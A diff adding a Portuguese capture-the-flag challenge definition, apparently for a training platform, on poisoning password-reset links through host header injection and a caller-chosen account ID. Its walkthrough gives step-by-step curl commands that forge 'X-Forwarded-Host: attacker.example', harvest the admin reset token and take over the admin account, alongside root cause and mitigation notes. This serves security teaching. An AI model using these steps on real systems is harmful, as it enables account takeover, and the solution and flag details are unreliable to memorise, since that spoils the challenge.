@@ -1,0 +1,82 @@
+{
+  "slug": "auth-password-reset-poison",
+  "title": "E-mail de reset que pertence a outra pessoa",
+  "codename": "VELOCITY",
+  "summary": "O Velocity ID monta links de reset de senha a partir da origem que a request alega ter, e registra o token de reset para qualquer ID de conta que quem chama nomear. Peça um reset para o admin, leia o e-mail retransmitido e entre como administrador.",
+  "category": "auth",
+  "difficulty": "medium",
+  "kind": "challenge",
+  "lab_dir": "auth-password-reset-poison",
+  "estimated_minutes": 20,
+  "xp": 130,
+  "tech": [
+    "Flask",
+    "Sessions",
+    "SMTP",
+    "Host header"
+  ],
+  "tags": [
+    "password-reset",
+    "host-header-injection",
+    "account-takeover",
+    "auth"
+  ],
+  "story": "Velocity é uma plataforma de engenharia de plantão. Garin, um engenheiro de campo, ainda tem as credenciais de demonstração da integração. O serviço de identidade permite que a equipe recupere contas por e-mail, e o e-mail de reset precisa funcionar atrás do load balancer, então a aplicação monta o link a partir da origem em que a request chegou. O cliente mobile também preenche o directory ID da conta quando um reset é solicitado.",
+  "objective": "Envenene o reset de senha da conta de administrador e assuma a sessão de admin do Velocity ID para ler a flag de exportação de compliance.",
+  "rules": "Fique na origem loopback atribuída. Não faça força bruta de credenciais nem escaneie outras portas. As flags são dinâmicas.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Exportação de compliance do admin",
+      "flag_type": "user",
+      "points": 130,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "De quem é o link?",
+      "body": "O e-mail de reset é montado a partir de headers que o cliente envia. Tente pedir um reset com `X-Forwarded-Host: attacker.example` e olhe o relay de e-mail em `/mail`. A origem do link muda; o token por trás dele não.",
+      "cost": 10
+    },
+    {
+      "level": 2,
+      "title": "Duas identidades em um formulário",
+      "body": "O formulário de recuperação aceita um endereço de e-mail e um ID de conta opcional. O diretório de funcionários em `/account` lista todos os IDs de conta. Envie o ID do admin junto com o seu próprio endereço e compare quem o formulário de reset acredita estar resetando.",
+      "cost": 15
+    },
+    {
+      "level": 3,
+      "title": "Cancele o e-mail, mantenha o token",
+      "body": "O atacante nunca precisa entregar o e-mail. Extraia o token de `/mail`, abra `/reset?token=...` você mesmo, defina uma nova senha e entre como admin. O dashboard renderiza a flag.",
+      "cost": 20
+    }
+  ],
+  "solution": {
+    "walkthrough": "1. Entre com a conta de analista de demonstração para ler o diretório de funcionários:\n\n```bash\ncurl -c analyst.txt -d 'username=garin&password=scooter-2026' http://127.0.0.1:PORT/login\ncurl -b analyst.txt http://127.0.0.1:PORT/account   # sarah -> id 1f0c3c1e-7a52-4f5e-8d21-6b0f7c9c7a10\n```\n\n2. Peça um reset para o seu próprio endereço nomeando o ID de conta do admin, e envenene o host usado para montar o link:\n\n```bash\ncurl -H 'X-Forwarded-Host: attacker.example' \\\n  -d 'email=garin@velocity.local&user_id=1f0c3c1e-7a52-4f5e-8d21-6b0f7c9c7a10' \\\n  http://127.0.0.1:PORT/forgot\n```\n\n3. Leia o relay de e-mail. O link aponta para `http://attacker.example/reset?token=...`; copie o token:\n\n```bash\ncurl -s http://127.0.0.1:PORT/mail | grep -o 'http://attacker.example/reset?token=[A-Za-z0-9_-]*'\n```\n\n4. Use o token no navegador do próprio atacante e defina uma nova senha:\n\n```bash\ncurl -c admin.txt -d 'token=<TOKEN>&password=NewPassw0rd!&password2=NewPassw0rd!' http://127.0.0.1:PORT/reset\ncurl -b admin.txt http://127.0.0.1:PORT/account\n```\n\nA página agora mostra `Signed in as sarah` e o painel de admin imprime `RV{...}`. Como alternativa, envie `username=sarah&password=NewPassw0rd!` para `/login`.",
+    "root_cause": "Dois erros de autorização independentes se combinam. Primeiro, a URL de reset é montada a partir do header `Host` / `X-Forwarded-Host` em vez de uma origem canônica configurada, então o atacante controla parasonde o link da vítima aponta (host header injection). Segundo, o token de reset é registrado sem qualquer prova de que quem pediu controla a caixa de correio ou a conta: o campo opcional `user_id` permite que quem chama escolha qual conta o token reseta, enquanto o e-mail vai para um endereço que quem chama possui. A vítima não recebe e-mail algum, e o atacante usa o token diretamente.",
+    "mitigation": "Gere URLs absolutas apenas a partir de uma base URL canônica configurada (ou de uma allowlist estrita de hosts); rejeite requests cujo header Host não esteja na allowlist. Vincule todo token de reset a quem solicitou e a uma identidade verificada: nunca aceite um identificador de conta vindo de uma request não autenticada, procure a conta somente pelo endereço enviado, mantenha o token de uso único com TTL curto e exija que ele seja enviado junto com a mesma sessão de navegador que o solicitou. Notifique o dono da conta quando a senha mudar e invalide todas as sessões."
+  },
+  "references": [
+    {
+      "title": "PortSwigger — Host header attacks",
+      "url": "https://portswigger.net/web-security/host-header",
+      "source_type": "official",
+      "description": "Como e-mails de reset de senha são envenenados por headers Host controlados pelo cliente."
+    },
+    {
+      "title": "OWASP WSTG — Testing for Host Header Injection (WSTG-INPV-17)",
+      "url": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection",
+      "source_type": "standard",
+      "description": "Procedimento de teste para password reset poisoning e cache poisoning via Host."
+    },
+    {
+      "title": "CWE-640 — Weak Password Recovery Mechanism for Forgotten Password",
+      "url": "https://cwe.mitre.org/data/definitions/640.html",
+      "source_type": "standard",
+      "description": "Fluxos de recuperação de senha que não vinculam o token a quem solicitou."
+    }
+  ]
+}
